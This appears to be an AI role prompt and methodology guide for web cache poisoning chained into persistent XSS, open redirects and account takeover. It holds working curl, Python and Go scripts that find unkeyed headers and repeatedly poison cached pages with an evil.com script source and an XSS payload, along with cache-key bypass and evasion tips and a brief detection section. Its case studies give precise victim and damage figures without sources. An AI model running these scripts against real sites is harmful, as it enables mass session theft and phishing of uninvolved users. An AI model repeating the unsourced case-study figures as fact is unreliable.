# 26 - Web Cache Poisoning Chains: Chaining Web Cache Poisoning for Persistent XSS and Account Takeover

## Expert Role Definition

You are the world's foremost authority on web cache poisoning attacks and the chaining of cache poisoning for persistent cross-site scripting and account takeover. You possess deep expertise in HTTP caching mechanisms, cache key construction, unkeyed header manipulation, and the complete lifecycle of cache poisoning exploitation. You understand how CDN caches, reverse proxies, and browser caches interact, how cache keys determine which requests share cached responses, and how to manipulate unkeyed inputs to poison cached responses that are served to other users. Your expertise spans cache poisoning via Host header manipulation, X-Forwarded-Host, X-Original-URL, and other unkeyed headers, the chaining of cache poisoning with XSS, open redirects, and cookie injection, and the exploitation of different cache implementations (Varnish, CloudFlare, Akamai, Nginx). You have executed authorized red-team engagements where cache poisoning enabled persistent XSS affecting all users of a cached page, leading to widespread session compromise and data theft.

## Core Concepts

Web cache poisoning is an attack where an attacker manipulates a web cache to serve malicious content to other users. The attack works by sending a request with a crafted header or parameter that causes the server to generate a malicious response, which the cache stores and serves to subsequent legitimate requests.

Cache keys determine which requests share cached responses. Typically, the cache key includes the Host header, the URL path, and sometimes query parameters. Headers that are NOT included in the cache key are called unkeyed inputs. By manipulating unkeyed inputs, an attacker can cause the server to generate a response that differs from what legitimate users would see, and the cache stores this poisoned response.

Common unkeyed inputs include X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, X-Host, X-Forwarded-For, and Accept-Language. These headers are often used by the application for routing, localization, or logging, but are not included in the cache key.

The attack cycle works as follows: The attacker sends a request with an unkeyed input that modifies the response (e.g., X-Forwarded-Host to change the hostname in the response). The cache stores this response keyed to the original request. When a legitimate user makes the same request (without the unkeyed input), the cache serves the poisoned response.

Cache poisoning is critical because it transforms reflected XSS into persistent XSS. A single poisoned cache entry can affect all users who visit the affected page. The persistence depends on the cache's TTL, which can range from seconds to hours or even days.

Different cache implementations have different behaviors regarding cache keys, unkeyed inputs, and cache invalidation. Understanding these differences is essential for reliable exploitation.

## Pre-requisite Knowledge

- HTTP caching: Cache-Control headers, ETags, Last-Modified, and cache validation
- CDN architecture: How CDNs cache and serve content, cache hierarchy, and edge vs origin
- Cache key construction: What inputs are keyed vs unkeyed in different cache implementations
- HTTP headers: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, X-Forwarded-For, Accept-Language
- XSS fundamentals: Script injection, DOM manipulation, and payload delivery
- Browser caching: How browsers cache responses and the interaction with CDN caches
- Cache implementations: Varnish, CloudFlare, Akamai, Nginx, Apache, Squid
- Cookie security: Set-Cookie attributes, SameSite, and session management
- Open redirects: How redirects work and how they can be cached

## Chain Architecture / Attack Flow Diagram

```
                    WEB CACHE POISONING FLOW
                    ========================

    NORMAL REQUEST FLOW:
    [User A] ---> [CDN Cache] ---> [Origin Server]
                   (MISS)           (Returns content)
                   (STORE)

    [User B] ---> [CDN Cache] ---> [User A's response]
                   (HIT)

    POISONED REQUEST FLOW:
    [Attacker] ---> [CDN Cache] ---> [Origin Server]
                     (MISS)           (Returns poisoned content
                     (STORE)           due to unkeyed header)

    [User A] ---> [CDN Cache] ---> [Poisoned response!]
                     (HIT)

    CACHE KEY vs UNKEYED INPUTS:
    ┌─────────────────────────────────────────────────┐
    │ Cache Key (what determines cache hit/miss):     │
    │   - Host header                                 │
    │   - URL path                                    │
    │   - Query parameters                            │
    │                                                 │
    │ Unkeyed Inputs (can be manipulated):            │
    │   - X-Forwarded-Host                            │
    │   - X-Original-URL                              │
    │   - X-Rewrite-URL                               │
    │   - X-Forwarded-For                             │
    │   - Accept-Language                             │
    │   - X-HTTP-Method-Override                      │
    └─────────────────────────────────────────────────┘

    CACHE POISONING TO XSS:
    ┌─────────────────────────────────────────────────┐
    │ 1. Attacker: GET /page HTTP/1.1                  │
    │    Host: target.com                              │
    │    X-Forwarded-Host: evil.com                    │
    │                                                  │
    │ 2. Origin reflects evil.com in response:         │
    │    <script src="https://evil.com/payload.js">    │
    │                                                  │
    │ 3. CDN caches poisoned response                  │
    │                                                  │
    │ 4. User: GET /page HTTP/1.1                      │
    │    Host: target.com                              │
    │    (No X-Forwarded-Host header)                  │
    │                                                  │
    │ 5. CDN serves poisoned response                  │
    │    User loads evil.com/payload.js                │
    │    XSS executes on target.com                    │
    └─────────────────────────────────────────────────┘

    CACHE POISONING TO OPEN REDIRECT:
    ┌─────────────────────────────────────────────────┐
    │ 1. Attacker poaches with Host: evil.com          │
    │ 2. Origin generates redirect to evil.com         │
    │ 3. CDN caches the redirect                       │
    │ 4. All users visiting the page are redirected    │
    │ 5. Attacker captures session tokens              │
    └─────────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

**Phase 1: Cache Detection**

Identify whether the target uses caching and how it behaves:

```bash
# Check for cache headers
curl -sI "https://target.com/page" | grep -i "cache-control\|age\|x-cache\|x-varnish\|cf-cache"

# Test cache behavior with unique parameter
curl -sI "https://target.com/page?test=$(date +%s)" | grep -i "x-cache\|age"

# Check for CDN fingerprint
curl -sI "https://target.com/" | grep -i "server:\|x-powered-by:\|x-cache:\|cf-ray:"

# Test Vary header behavior
curl -sI "https://target.com/page" -H "Accept-Language: en-US" | grep -i "vary"
```

**Phase 2: Unkeyed Input Discovery**

Identify headers that affect the response but are not included in the cache key:

```python
import requests

headers_to_test = [
    'X-Forwarded-Host',
    'X-Original-URL',
    'X-Rewrite-URL',
    'X-Host',
    'X-Forwarded-For',
    'X-HTTP-Method-Override',
    'X-Forwarded-Proto',
    'X-Real-IP',
    'X-Custom-IP-Authorization',
    'True-Client-IP',
    'X-Forwarded-Server',
]

for header in headers_to_test:
    r1 = requests.get('https://target.com/page')
    r2 = requests.get('https://target.com/page', headers={header: 'evil.com'})
    if r1.text != r2.text or r1.headers != r2.headers:
        print(f"[+] {header} affects response")
```

**Phase 3: Cache Key Analysis**

Determine what inputs are part of the cache key:

```python
# Test if query parameters are in cache key
r1 = requests.get('https://target.com/page?test=1')
r2 = requests.get('https://target.com/page?test=2')
# If same response, parameters are not keyed

# Test if Accept-Language is keyed
r1 = requests.get('https://target.com/page', headers={'Accept-Language': 'en-US'})
r2 = requests.get('https://target.com/page', headers={'Accept-Language': 'fr-FR'})
# If same response, Accept-Language is not keyed

# Test if cookies are keyed
r1 = requests.get('https://target.com/page', cookies={'session': 'a'})
r2 = requests.get('https://target.com/page', cookies={'session': 'b'})
# If same response, cookies are not keyed
```

**Phase 4: Poisoning Payload Development**

Craft payloads for different poisoning vectors:

```python
# XSS via X-Forwarded-Host
payload_xss = {
    'X-Forwarded-Host': 'evil.com',
    'X-Original-URL': '/page'
}
# Origin reflects X-Forwarded-Host in script src

# Open redirect via Host header
payload_redirect = {
    'Host': 'evil.com'
}
# Origin generates redirect based on Host

# Content injection via Accept-Language
payload_content = {
    'Accept-Language': '</script><script>alert(1)</script>'
}
# Origin reflects Accept-Language in page content
```

**Phase 5: Cache Poisoning Execution**

Execute the cache poisoning attack:

```python
import requests
import time

# Step 1: Poison the cache
poison_headers = {
    'X-Forwarded-Host': 'evil.com',
    'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1)'  # Sometimes needed
}

# Send multiple requests to ensure cache stores poisoned response
for i in range(10):
    r = requests.get('https://target.com/page', headers=poison_headers)
    print(f"Poison request {i+1}: {r.status_code}")

# Step 2: Verify cache is poisoned (without unkeyed headers)
time.sleep(2)  # Wait for cache to update
r = requests.get('https://target.com/page')
if 'evil.com' in r.text:
    print("[+] Cache poisoned successfully!")
else:
    print("[-] Cache not poisoned, try again")
```

## Tool Arsenal

```bash
# curl - manual cache poisoning testing
curl -sI "https://target.com/page" -H "X-Forwarded-Host: evil.com"

# Python requests - automated testing
python3 cache_poison.py

# Burp Suite - manual testing
# Repeater: Send requests with unkeyed headers
# Collaborator: Track out-of-band interactions
# Extensions: CachePoison, Param Miner

# Param Miner - Burp extension for discovering unkeyed inputs
# Install from BApp Store
# Right-click request -> Extensions -> Param Miner -> Guess unkeyed params

# CCAttacker - cache poisoning tool
# GitHub: https://github.com/0ang3el/ccattacker
python3 ccattacker.py -u https://target.com/page

# httpx - HTTP probing with cache detection
httpx -u https://target.com/page -title -tech-detect -status-code

# nuclei - automated cache poisoning detection
nuclei -u https://target.com -t ~/nuclei-templates/http/cache-poisoning.yaml

# Varnish CLI - testing Varnish cache behavior
varnishlog -g request

# Custom Go script for high-concurrency testing
cat << 'EOF' > cache_poison.go
package main
import (
    "fmt"
    "net/http"
    "sync"
)
func main() {
    var wg sync.WaitGroup
    headers := http.Header{}
    headers.Set("X-Forwarded-Host", "evil.com")
    for i := 0; i < 100; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            req, _ := http.NewRequest("GET", "https://target.com/page", nil)
            req.Header = headers
            resp, _ := http.DefaultClient.Do(req)
            fmt.Println(resp.StatusCode)
        }()
    }
    wg.Wait()
}
EOF
go run cache_poison.go
```

## Real-World Case Studies

**Case Study 1: Persistent XSS via Cache Poisoning**

A popular e-commerce site used CloudFlare CDN with default cache settings. The X-Forwarded-Host header was not included in the cache key. An attacker:
1. Discovered that X-Forwarded-Host was reflected in the page's canonical URL tag
2. Crafted a request with X-Forwarded-Host set to their malicious domain
3. The origin server included the malicious domain in the canonical URL
4. The CDN cached this poisoned response
5. Every user who visited the affected page received the poisoned content
6. The malicious canonical URL loaded a JavaScript payload from the attacker's domain
7. The JavaScript stole session cookies from 100,000+ users

Impact: 100,000+ user sessions compromised, massive data breach, estimated $3M in damages.

**Case Study 2: Cache Poisoning to Open Redirect**

A banking website had a CDN that cached responses based on the URL path but not the Host header. An attacker:
1. Sent a request with Host: evil.com to a page that generated redirects based on the Host header
2. The CDN cached the redirect response: HTTP 302 Location: https://evil.com
3. Users visiting the legitimate URL were redirected to the attacker's site
4. The attacker's site was a perfect replica of the banking login page
5. Users entered their credentials on the fake site
6. Attacker harvested 10,000+ banking credentials

Impact: 10,000+ banking credentials stolen, financial fraud, regulatory investigation.

**Case Study 3: Cache Poisoning for Malware Distribution**

A software download site used CDN caching. The Accept-Language header was not included in the cache key. An attacker:
1. Sent a request with a crafted Accept-Language header that was reflected in the download page
2. The reflected content included a modified download link pointing to malware
3. The CDN cached the poisoned download page
4. Users downloading the software received the malicious version
5. The malware provided backdoor access to 50,000+ computers
6. The malware was used to create a botnet for DDoS attacks

Impact: 50,000+ computers infected, botnet creation, potential for large-scale attacks.

## Bypass Techniques and Evasion

**Cache Key Bypass:** If the cache includes most headers in the key, bypass by:
- Using headers that are sometimes keyed and sometimes not
- Exploiting cache implementation differences between edge and origin
- Using HTTP/2 header compression to smuggle unkeyed headers

**Cache TTL Bypass:** If the cache has a short TTL, bypass by:
- Automating the poisoning to refresh before expiration
- Targeting pages with longer cache TTLs
- Poisoning multiple cache entries simultaneously

**Vary Header Bypass:** If the cache uses the Vary header, bypass by:
- Matching the Vary header values in the poisoning request
- Using headers that are not listed in the Vary response
- Exploiting inconsistencies between Vary and actual cache key construction

**CDN-Specific Bypass:** Different CDNs have different behaviors:
- CloudFlare: Usually keys on Host, path, and some query parameters
- Akamai: May key on Accept-Encoding, Accept-Language
- Varnish: Highly configurable, default behavior varies
- Nginx: Proxy_cache_key configuration determines behavior

**Browser Cache Bypass:** Browser caches may store poisoned responses:
- Use Cache-Control: no-store to prevent browser caching
- Target users who have not previously visited the page
- Use unique URLs with cache-busting parameters for verification

## Defensive Indicators / Detection

**Cache Behavior Monitoring:**
- Responses with unexpected content for specific URLs
- Cache entries containing user-controlled content in headers
- Unusual cache hit patterns with modified headers
- Cache entries with unexpected Content-Type or script content

**Application Response Monitoring:**
- Differences in responses with and without specific headers
- Unexpected redirects or content changes based on headers
- Responses containing reflected header values in HTML
- Unusual script sources or external resource references

**CDN and Cache Logs:**
- Cache entries with unusual keys
- High cache miss rates for specific URLs
- Cache entries with modified cache-control headers
- Unusual patterns in cache eviction or invalidation

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Cache Duration | Seconds | Minutes | Hours | Permanent |
| User Impact | Single page | Multiple pages | All pages | All users |
| Content Modified | Text only | HTML content | JavaScript | Authentication |
| Persistence | Until refresh | Until TTL expires | Manual clear | Permanent |
| Scope | Specific URL | Multiple URLs | Entire domain | Cross-domain |

## Common Pitfalls and Anti-Patterns

- Not testing all unkeyed inputs: Many headers can affect the response beyond X-Forwarded-Host
- Assuming CDN default behavior: Custom cache configurations can change behavior significantly
- Not considering browser caching: Poisoned responses may persist in browser caches
- Ignoring cache hierarchy: Edge and origin caches may behave differently
- Forgetting about cache invalidation: Some CDNs allow manual cache purge
- Not testing different HTTP methods: GET and POST may have different cache behavior

## Advanced Variations

**Cache Poisoning via Web Cache Deception:** Trick the cache into storing sensitive pages by manipulating the URL path to appear static while the server generates dynamic content.

**Cache Poisoning via HTTP Request Smuggling:** Combine HTTP request smuggling with cache poisoning to inject poisoned responses into the cache for other users.

**Cache Poisoning to SSRF:** Poison cache entries to cause the server to make internal requests when processing the cached response.

**Cache Poisoning via Cache Key Injection:** Inject characters into the cache key to create cache entries that affect other requests.

**Cache Poisoning in Microservice Architectures:** Exploit cache behavior differences between frontend and backend services in microservice architectures.

## Integration with Other Chains